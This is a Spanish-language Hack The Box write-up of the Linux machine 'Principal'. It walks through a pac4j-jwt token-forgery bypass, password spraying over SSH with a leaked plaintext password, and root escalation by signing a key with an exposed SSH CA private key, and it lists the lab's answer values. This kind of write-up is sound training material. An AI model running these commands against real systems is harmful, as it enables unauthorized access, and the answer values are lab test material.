# HTB - Principal Writeup

**Autor:** TRNNSK
**Dificultad:** Medium
**Sistema:** Linux

---

# Resumen

La máquina **Principal** presenta una vulnerabilidad en el manejo de autenticación basada en JWT mediante la librería pac4j-jwt. Es posible forjar un token válido aprovechando una mala validación criptográfica, lo que permite acceso como administrador. Posteriormente, se obtienen credenciales reutilizables para acceso SSH. La escalada de privilegios se logra explotando una mala configuración de una Certificate Authority (CA) para autenticación SSH.

---

# Enumeración

## Escaneo inicial

```bash
nmap -sC -sV 10.129.244.220
```

### Resultados:

```
22/tcp open  ssh     OpenSSH 9.6p1
8080/tcp open http    Jetty (pac4j-jwt/6.0.3)
```

### Respuesta HTB:
- **How many open TCP ports are listening on Principal?** → `2`

---

# Análisis Web

Al acceder al puerto 8080, se identifica una aplicación web con autenticación basada en JWT.

Mediante inspección del código fuente:

- `/static/js/app.js`
- `/api/auth/login`
- `/api/auth/jwks`

El endpoint `/api/auth/jwks` expone claves públicas utilizadas en el proceso de autenticación.

### Respuesta HTB:
- **Which endpoint serves the main JavaScript file?** → `/static/js/app.js`
- **What API endpoint holds a public key?** → `/api/auth/jwks`

---

# Vulnerabilidad: JWT Authentication Bypass

Se identifica que la aplicación usa pac4j-jwt versión 6.0.3.

### Explicación técnica:

- Se acepta un token JWE válido
- El JWT interno usa `alg: none`
- No se valida la firma

Esto permite generar tokens arbitrarios con privilegios elevados.

### Respuesta HTB:
- **What version of pac4j-jwt is in use?** → `6.0.3`

---

# Explotación (Foothold)

Se utiliza un script para forjar un token JWT:

```bash
python3 jwt.py http://10.129.244.220:8080
```

### Output:

```
Authenticated as: admin (ROLE_ADMIN)
```

Se obtiene acceso al dashboard como administrador (del site, no del servidor).

---

# Extracción de Credenciales

Desde el panel administrativo se encuentra una contraseña en texto plano:

```
D3pl0y_$$H_Now42!
```

### Respuesta HTB:
- **What is the plaintext password that can be found in the web application?** → `D3pl0y_$$H_Now42!`

---

# Acceso inicial

Se realiza password spraying:

```bash
nxc ssh 10.129.244.220 -u users.txt -p 'D3pl0y_$$H_Now42!'
```

### Resultado:

```
svc-deploy:D3pl0y_$$H_Now42!
```

```bash
ssh svc-deploy@10.129.244.220
```

### Respuesta HTB:
- **Which user can successfully authenticate to SSH using the plaintext password?** → `svc-deploy`

---

# User Flag

```bash
cat /home/svc-deploy/user.txt
```

### Respuesta HTB:
- **Submit the flag located in the svc-deploy user's home directory.**

---

# Escalada de Privilegios

## Enumeración

```bash
id
```

Resultado:

```
deployers
```

### Respuesta HTB:
- **What interesting group is svc-deploy part of?** → `deployers`

---

## Acceso a recursos sensibles

```bash
find / -group deployers 2>/dev/null
```

### Resultado clave:

```
/opt/principal/ssh
```

### Respuesta HTB:
- **What directory does the deployers group have read access to?** → `/opt/principal/ssh`

---

# Explotación de SSH CA

Se identifica una mala configuración de Certificate Authority:

- La clave privada de la CA es accesible
- El sistema confía en certificados firmados por esta CA

### Generación de clave

```bash
ssh-keygen -t ed25519 -f /tmp/pwn -N ""
```

### Firma como root

```bash
ssh-keygen -s /opt/principal/ssh/ca -I "pwn-root" -n root -V +1h /tmp/pwn.pub
```

### Acceso como root

```bash
ssh -i /tmp/pwn root@localhost
```

---

# Root Flag

```bash
cat /root/root.txt
```

### Respuesta HTB:
- **Submit the flag located in the root user's home directory.**

---

# TLDR MUCHO TEXTO

1. Escanear con Nmap
2. Analizar aplicación web
3. Identificar endpoints
4. Explotar JWT mal validado con un script
5. Acceder como admin
6. Extraer credenciales
7. Realizar password spraying
8. Acceder por SSH
9. Enumerar privilegios
10. Abusar de SSH CA
11. Escalar a root

---

# Conclusión

Esta máquina demuestra cómo:

- Una mala validación de JWT permite bypass de autenticación
- La reutilización de credenciales facilita el acceso
- Una mala configuración de SSH CA permite escalada completa

puede llevar a un compromiso total del sistema.

---

y ya

